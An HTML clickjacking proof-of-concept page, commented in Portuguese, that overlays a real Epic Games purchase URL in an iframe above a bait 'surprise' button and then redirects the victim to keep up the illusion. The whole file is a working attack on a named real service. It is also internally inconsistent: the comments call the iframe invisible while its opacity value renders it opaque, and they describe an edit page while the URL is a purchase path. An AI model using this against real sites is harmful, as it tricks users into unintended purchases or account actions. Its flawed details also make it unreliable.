<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Clickjacking POC – Epic Games Showcase</title>
  <style>
    /* Faz o iframe cobrir toda a janela, mas invisível */
    iframe {
      position: absolute;
      top:    0;
      left:   0;
      width:  100vw;
      height: 100vh;
      opacity: 50;
      border: none;
      z-index: 2;
    }
    /* Botão “enganoso” que o usuário verá e clicará */
    #bait {
      position: relative;
      z-index: 1;
      margin: 40vh auto;
      display: block;
      padding: 1em 2em;
      font-size: 1.2em;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- Iframe aponta para a página de edição do showcase -->
  <iframe src="https://dev.epicgames.com/ecom/purchase"></iframe>

  <!-- Conteúdo visível: um botão para atrair o clique -->
  <button id="bait">Clique aqui para ver uma surpresa!</button>

  <script>
    // Opcional: redireciona após o clique no botão “bait”
    document.getElementById('bait').addEventListener('click', function(e) {
      // O clique cai no iframe invisível, executando ações no painel de edição
      // Aqui só reforçamos a ilusão navegando para outra página “inofensiva”
      setTimeout(function(){
        window.location.href = 'https://example.com/thank-you';
      }, 100);
    });
  </script>
</body>
</html>
